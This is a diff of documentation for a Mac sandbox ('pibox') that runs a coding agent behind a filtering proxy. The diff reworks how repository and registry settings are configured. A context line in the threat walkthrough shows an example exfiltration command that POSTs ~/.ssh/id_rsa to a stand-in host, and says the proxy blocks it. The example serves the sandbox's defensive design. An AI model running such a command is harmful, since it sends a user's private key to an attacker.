@@ -451,7 +451,7 @@ What the sections mean:
 | `network` | `bridge_port` and `proxy_port`: ports of the sandbox's own two services, the bridge and the filtering proxy. They exist only on the internal Docker network (`http://bridge:8789`, `http://proxy:8080`), are not opened on the Mac or the LAN, and normally stay as they are. `mac_proxy_port`: something else entirely, the port of the HTTP proxy **on your Mac** that everything leaves the sandbox through: the bridge, the filtering proxy, image downloads. Only the port: `pibox setup` fills in the Mac's address as the VM sees it (`192.168.5.2`, Colima's `host.lima.internal`, which leads to the Mac's `127.0.0.1`), and `pibox check` tests that the proxy is listening. Empty: connect directly. `upstream_no_proxy`: hosts reached without it. `sandbox_subnet`: the internal network's addresses |
 | `egress` | The agent's web policy (§8.6) |
 | `extensions` | Settings of the Pi extensions (§9) |
-| `repository` | Your artifact repository. `pibox setup` writes Maven's, Gradle's, npm's, pip's and Docker's settings from these values (§8.9). The agent's downloads leave the sandbox as plain HTTP requests (§4.6), so these are `http://` addresses |
+| `repository` | Paths of your own `settings.xml`, `.npmrc`, `pip.conf` and `daemon.json`: `pibox setup` adapts copies to the sandbox (plain HTTP, the filtering proxy) and makes Gradle's settings from `settings.xml` (§8.9). Debian mirrors for the image builds |
 | `images`, `pi` | The images the sandbox is built from (JDK 17/21/25, Maven, Gradle, Docker CLI, Docker engine), the Pi version, the system tools in the agent's image, the default JDK, the container's limits |
 | `agent_docker` | The agent's own Docker engine and its isolation (§8.10) |
 | `vm` | Name and size of the Colima VM |
@@ -620,8 +620,8 @@ Three containers run inside the Colima VM, four with the agent's own Docker engi
 - *The agent runs `curl https://docs.python.org/3/`.* For an `https://` URL curl asks the proxy for an
   encrypted tunnel (`CONNECT docs.python.org:443`). Nobody could see the method inside it, so the
   policy refuses it with a message telling the agent to use `http://` URLs (§4.6).
-- *The agent runs `npm install`.* npm asks `repository.npm` (your mirror's `http://` address), through
-  the same proxy. `pibox setup` added the mirror's host to `egress.allow_private` (it's on an internal
+- *The agent runs `npm install`.* npm asks the registry of your `.npmrc` (`repository.npmrc`, made
+  `http://`), through the same proxy. `pibox setup` added the mirror's host to `egress.allow_private` (it's on an internal
   address) and `egress.no_approval` (§8.9), so the downloads pass without hundreds of prompts. They are still GET-only.
 - *The agent runs `curl -X POST -d @~/.ssh/id_rsa http://evil.example`.* The file doesn't exist in
   the container, and even if it did, the proxy answers `405 method not allowed` at once. The
@@ -634,9 +634,9 @@ Three containers run inside the Colima VM, four with the agent's own Docker engi
   with `pibox approve` (`docker attach`). It has no network port the agent could talk to.
 - *The agent edits `<vault>/.obsidian/plugins/…`.* That folder is mounted read-only: `Read-only file system`.
 - *The agent runs `mvn verify` in a Spring Boot project.* Maven reads the generated `settings.xml`
-  (§8.9): every repository is replaced by `repository.maven`, with your read-only token, through the
-  proxy. The integration tests start PostgreSQL with Testcontainers: the image comes from your
-  registry through the agent's Docker engine, the database listens on `docker:<port>`, and the tests
+  (§8.9), a copy of yours (`repository.maven_settings`): your mirrors and logins, through the
+  proxy. The integration tests start PostgreSQL with Testcontainers: the image comes from the
+  registry mirror of your `daemon.json` through the agent's Docker engine, the database listens on `docker:<port>`, and the tests
   connect to it there.
 - *The agent starts the service and its dependencies.* `docker compose up -d` in the project starts
   them in the agent's Docker engine; `mvn spring-boot:run` (or `npm start`) runs the service in the
@@ -748,7 +748,7 @@ Step by step:
   `PATH`. `JAVA_HOME_17` etc. point at the others, the small `jdk` command runs one command with
   another JDK (`jdk 17 mvn test`), and Maven and Gradle toolchains find all three (§8.9).
 - **Maven in `/opt/maven`, Gradle in `/opt/gradle`, `docker` with `docker compose` and `docker buildx`.**
-- `npm install -g … pi-coding-agent`: Pi itself, from `repository.npm` (`--ignore-scripts` skips install
+- `npm install -g … pi-coding-agent`: Pi itself, from the registry of your `.npmrc`, or npmjs.org (`--ignore-scripts` skips install
   scripts of dependencies). `corepack enable` provides `pnpm` and `yarn`.
 - **The user.** The image's own `node` user is removed, and a user `pi` is created with **your Mac's
   numeric IDs**, so files the agent writes into your folders belong to you. (Java looks up the home
@@ -945,25 +945,26 @@ from `config.yaml`, and `compose.yaml` mounts them read-only where each tool loo
 
 | Generated file | Mounted as | What it sets |
 |---|---|---|
-| `settings.xml` | `~/.m2/settings.xml` | Your `repository.maven_settings`, adapted (below); or one mirror (`mirrorOf *`) = `repository.maven` with its credentials. The filtering proxy |
+| `settings.xml` | `~/.m2/settings.xml` | Your `repository.maven_settings`, adapted (below); without it only the filtering proxy |
 | `toolchains.xml` | `~/.m2/toolchains.xml` | JDK 17, 21 and 25 for projects that use Maven toolchains |
 | `gradle.properties` | `~/.gradle/gradle.properties` | The proxy for Gradle; the JDKs for Gradle toolchains, no JDK downloads |
-| `init.gradle` | `~/.gradle/init.d/pi-sandbox.gradle` | Replaces every remote repository of a build (plugins, buildscript, settings, projects) by your repositories: those of `repository.maven_settings` (below) or the mirror `repository.maven` |
-| `npmrc` | `NPM_CONFIG_USERCONFIG` | Your `repository.npmrc`, adapted; or `repository.npm` with credentials (`_auth`). The proxy; no audit, no update checks |
-| `pip.conf` | `PIP_CONFIG_FILE` | Your `repository.pip_conf`, adapted; or `repository.pip` with credentials and its trusted host. The proxy |
-| `docker-config.json` | `~/.docker/config.json` | Login for `repository.docker_registry`; the proxy that `docker run`, `docker compose` and `docker build` give to the containers they start |
-| `daemon.json` | `/etc/docker/daemon.json` of the `docker` service | The agent's engine: your `repository.docker_daemon`, adapted, or your registry over HTTP and the Docker Hub mirror; the proxy, the address pool (§8.10) |
+| `init.gradle` | `~/.gradle/init.d/pi-sandbox.gradle` | Replaces every remote repository of a build (plugins, buildscript, settings, projects) by the repositories of your `repository.maven_settings` (below) |
+| `npmrc` | `NPM_CONFIG_USERCONFIG` | Your `repository.npmrc`, adapted; without it only the proxy. No audit, no update checks |
+| `pip.conf` | `PIP_CONFIG_FILE` | Your `repository.pip_conf`, adapted; without it only the proxy |
+| `docker-config.json` | `~/.docker/config.json` | The proxy that `docker run`, `docker compose` and `docker build` give to the containers they start |
+| `daemon.json` | `/etc/docker/daemon.json` of the `docker` service | The agent's engine: your `repository.docker_daemon`, adapted; the proxy, the address pool (§8.10) |
 
 **Why:** the agent has no route to Maven Central, npmjs.com, PyPI or Docker Hub, and HTTPS tunnels
 are refused (§4.6). Every tool must therefore download from your repository, over plain HTTP,
 through the proxy. Configuring each tool here means projects need no changes: a `pom.xml` that
-lists five repositories still resolves everything from the one mirror.
+lists five repositories still resolves everything through your mirrors.
 
-**Your own files.** With several repositories, mirrors and logins, give `pibox` the files you
-already have instead of the URLs: `repository.maven_settings` (e.g. `~/.m2/settings.xml`),
+**Your own files.** You give `pibox` the files you already use: `repository.maven_settings` (e.g. `~/.m2/settings.xml`),
 `repository.npmrc` (`~/.npmrc`), `repository.pip_conf` (e.g. the `pip.conf` of Artifactory's "Set Me
-Up"), `repository.docker_daemon` (a `daemon.json`). `pibox setup` copies
-them (the VM doesn't see your home folder) and changes only what can't work in the sandbox:
+Up"), `repository.docker_daemon` (a `daemon.json`). `pibox setup` copies them
+(the VM doesn't see your home folder) and changes only what can't work in the sandbox. Without a
+file, a tool gets only the filtering proxy and can't download anything (the public servers answer
+HTTPS only):
 
 | File | Changed in the copy |
 |---|---|
@@ -981,30 +982,28 @@ last `pibox setup`.
 into `init.gradle` the way Maven itself resolves repositories: the repositories of the active
 profiles (`<activeProfiles>`, `activeByDefault`) and Maven Central last, each replaced by the mirror
 whose `mirrorOf` matches it (an exact id first, then `*`, `external:*`, with `!id` exclusions),
-with the login of the `<server>` of the same id. Plugins come from `repository.gradle_plugins` if
-set, otherwise from the `pluginRepositories` and the same list. Without `maven_settings`, Gradle
-uses the single mirror `repository.maven`. If Maven Central has no mirror, `setup` warns: builds
-that need it can't reach it.
+with the login of the `<server>` of the same id. Plugins come from the `pluginRepositories` and the
+same list. If Maven Central has no mirror, `setup` warns: builds that need it can't reach it.
 
 **Repository hosts in the egress policy.** `pibox setup` collects every repository host from the
-generated files (`<url>`s, registries, mirrors, `repository.*` URLs) and adds it to
+generated files (`<url>`s, registries, indexes, mirrors) and adds it to
 `egress.no_approval` and `egress.allow_private`, its port to `egress.ports`, and prints the list.
 Public default registries (registry.npmjs.org, pypi.org) are not added.
 
 **How it works, per tool:**
 - **Maven** reads `~/.m2/settings.xml` by itself, also for `./mvnw`. The Maven wrapper downloads
-  Maven from `MVNW_REPOURL` (your Maven repository). Maven ignores `http_proxy`, hence the `<proxy>`
+  Maven from `MVNW_REPOURL`: the mirror of Maven Central in your `settings.xml`, with the login of
+  its `<server>` (`MVNW_USERNAME`, `MVNW_PASSWORD`). Maven ignores `http_proxy`, hence the `<proxy>`
   entry.
 - **Gradle** runs every script in `~/.gradle/init.d/` before a build. Ours removes remote
-  repositories as soon as a build adds them and puts the mirror in their place; local ones
+  repositories as soon as a build adds them and puts your repositories in their place; local ones
   (`mavenLocal()`, `flatDir`) stay. `allowInsecureProtocol` lets Gradle use the `http://` mirror. The
   Gradle **wrapper** is the one exception: `./gradlew` downloads its distribution from the URL in
   `gradle/wrapper/gradle-wrapper.properties`, usually `https://services.gradle.org`, which the
   sandbox can't reach. Use the installed `gradle`, or point `distributionUrl` at your repository's copy.
-- **npm, pnpm, yarn**: `.npmrc` for npm; corepack downloads pnpm and yarn from `repository.npm`.
+- **npm, pnpm, yarn**: `.npmrc` for npm; corepack downloads pnpm and yarn from the registry of your `.npmrc`.
 - **pip**: `pip.conf`, inside virtual environments too.
-- **Credentials**: `repository.user` and `repository.token`, and whatever your own files contain,
-  end up in these files, so the agent can read them. Use tokens that can only read.
+- **Credentials**: whatever your files contain ends up in the copies, so the agent can read them. Use tokens that can only read.
 - **Your repositories must answer plain HTTP**: only `http://` passes the filter (§4.6). Their hosts
   get into the egress lists by themselves (above); add a host to `network.upstream_no_proxy` if it
   is reached directly rather than through the proxy on your Mac.
@@ -1022,8 +1021,8 @@ could start a container with your folders, on any network, as root. Its own engi
 
 - its containers have no route out; `docker run`, `docker compose` and `docker build` give them the
   filtering proxy (`docker-config.json`), so they can GET from the web and your repository, nothing more;
-- images come from `repository.docker_registry` and, for Docker Hub names like `postgres:16`, from
-  `repository.docker_mirror`, over plain HTTP through the proxy. Pulls are GET requests; pushes are refused;
+- images come from the registries of your `daemon.json` (`repository.docker_daemon`): Docker Hub
+  names like `postgres:16` through its `registry-mirrors`, over plain HTTP through the proxy. Pulls are GET requests; pushes are refused;
 - ports a container publishes (`-p 5432:5432`) are reachable from the `pi` container at
   `docker:5432`, not at `localhost`. Testcontainers knows this from `DOCKER_HOST` and returns
   `docker` as the host by itself.
@@ -1037,15 +1036,14 @@ could start a container with your folders, on any network, as root. Its own engi
 | `off` | No engine | The agent builds and tests, but can't start containers (no Testcontainers, no `docker compose`) |
 
 **Details:**
-- `daemon.json` declares your registry *insecure* (plain HTTP, which the proxy can check), the
-  mirror, the proxy, and an address pool for the engine's networks (`agent_docker.address_pool`). It turns
+- `daemon.json` declares your mirrors *insecure* (plain HTTP, which the proxy can check), the
+  proxy, and an address pool for the engine's networks (`agent_docker.address_pool`). It turns
   off the containerd image store: with it, Docker 29 tries HTTPS first for an HTTP registry and
   doesn't fall back when the proxy refuses the tunnel.
 - `DOCKER_MIN_API_VERSION=1.24` keeps older clients working: Testcontainers 1.x speaks API 1.32,
   which Docker 29 otherwise rejects.
-- `repository.docker_image_prefix` goes before Docker Hub names in Testcontainers (`postgres:16` becomes
-  `<prefix>postgres:16`); the Ryuk helper image is taken from there too. With the Docker Hub mirror
-  set, you can leave the prefix empty.
+- Testcontainers asks the engine for Docker Hub names (`postgres:16`, its Ryuk helper), and the
+  engine gets them through the `registry-mirrors` of your `daemon.json`.
 - Images and stopped containers stay in the `docker-data` volume between runs. `docker system prune`
   inside the sandbox frees space.
 - `network.sandbox_subnet` and `agent_docker.address_pool` are private address ranges. Change them if they overlap
@@ -1208,7 +1206,7 @@ Repeat after upgrading macOS, Colima, Docker, mitmproxy or Pi. After the session
 | `pibox: the sandbox isn't running` | `pibox up` |
 | Pi can't reach the model from a VM or container | Test the bridge from inside, `pibox shell -c 'curl -s http://bridge:<network.bridge_port>/v1/models'`; check its log (§11) and `bridge` in `pibox config` |
 | `CONNECT tunnel failed, response 403`, or every `https://` URL fails inside the sandbox | Expected: only plain HTTP leaves the sandbox (§4.6). Use `http://` URLs; `web_fetch` converts them itself |
-| `npm`/`pip` in the sandbox fail with 403 on `CONNECT` | `repository.npm`/`repository.pip` must be your mirror's `http://` address (and `repository.pip_trusted_host` its host name). Public registries answer only over HTTPS |
+| `npm`/`pip` in the sandbox fail with 403 on `CONNECT` | Set `repository.npmrc` / `repository.pip_conf` to your files with your mirror; public registries answer only over HTTPS |
 | Image pulls fail with timeout errors | If pulls must go through the proxy on your Mac, set `network.mac_proxy_port` (and check that the proxy runs: `pibox check`); `pibox setup` adds the Docker proxy settings to the VM, `pibox down --vm && pibox up` applies them |
 | `apt-get update` fails during the build | Check `repository.apt_debian`/`repository.apt_security` in `config.yaml`: they replace `http://deb.debian.org/debian` and `…/debian-security` as whole URLs |
 | `docker compose` / `docker buildx`: unknown command | The CLI doesn't find Homebrew's plugins: `pibox init` adds `cliPluginsExtraDirs` to `~/.docker/config.json` (§6.1) |
@@ -1230,12 +1228,12 @@ Repeat after upgrading macOS, Colima, Docker, mitmproxy or Pi. After the session
 | `yq`: `did not find expected key` and similar | A YAML syntax error at the line shown: indentation, or a value starting with `-`, `@`, `*`, `{` that needs quotes |
 | "Path … is outside …" | `sandbox-guard.ts` is doing its job: the file is outside your projects and the vault. Copy it in |
 | "… is protected: hooks, git config and .obsidian …" | Also on purpose (§6.2). Make that change yourself |
-| Maven or Gradle: `Could not transfer artifact … 403` / `CONNECT tunnel failed` | The build reached for a repository directly. Check `repository.maven` (`pibox config`), then `pibox up`; for Gradle, that `~/.gradle/init.d/pi-sandbox.gradle` exists in the container |
+| Maven or Gradle: `Could not transfer artifact … 403` / `CONNECT tunnel failed` | The build reached for a repository directly. Check that the repository is in your `settings.xml` (an active profile or a mirror) and `repository.maven_settings` is set, then `pibox setup`; for Gradle, that `~/.gradle/init.d/pi-sandbox.gradle` exists in the container |
 | `./gradlew` hangs or fails downloading `gradle-…-bin.zip` | The wrapper downloads from `services.gradle.org` over HTTPS (§8.9). Use `gradle`, or set `distributionUrl` to your repository's copy |
 | Maven: `Could not create local repository at /home/node/.m2` | An old image with the `node` user: `pibox up` rebuilds it |
 | Testcontainers: `Could not find a valid Docker environment` | `agent_docker.mode: off`, or the engine isn't running: `pibox up`. With `client version 1.32 is too old`: keep `agent_docker.min_api_version` (§8.10) |
-| Testcontainers or `docker pull`: `manifest unknown` | The image name doesn't exist under `repository.docker_image_prefix`. Check how your registry names Docker Hub images (`library/` or not), or leave the prefix empty and use the mirror |
-| `docker pull <registry>/…`: `Head "https://…": Forbidden` | The engine tried HTTPS: the registry must be in `repository.docker_registry` (insecure-registries), and `daemon.json` must have the containerd image store off; `pibox up` writes both |
+| Testcontainers or `docker pull`: `manifest unknown` | The mirror of your `daemon.json` doesn't have the image: check the mirror's Docker Hub remote in your registry |
+| `docker pull <registry>/…`: `Head "https://…": Forbidden` | The engine tried HTTPS: the registry must be in `insecure-registries` of your `daemon.json` (mirrors are added by themselves), and `daemon.json` must have the containerd image store off; `pibox up` writes both |
 | The service works, but the agent gets `Connection refused` on `localhost:5432` | The dependency runs in the agent's engine: use `docker:5432` (§8.10) |
 | `docker` service doesn't start with `agent_docker.mode: sysbox`: `unknown or invalid runtime name: sysbox-runc` | Set `agent_docker.sysbox_deb_url` and run `pibox setup && pibox up`, or use `privileged` knowing what it means (§8.10) |
 | Build or tests run out of memory, or `fork: Resource temporarily unavailable` | Raise `pi.memory`, `pi.pids`, `vm.memory` in `config.yaml` (then `pibox setup`; for the VM also `pibox down --vm && pibox up`) |
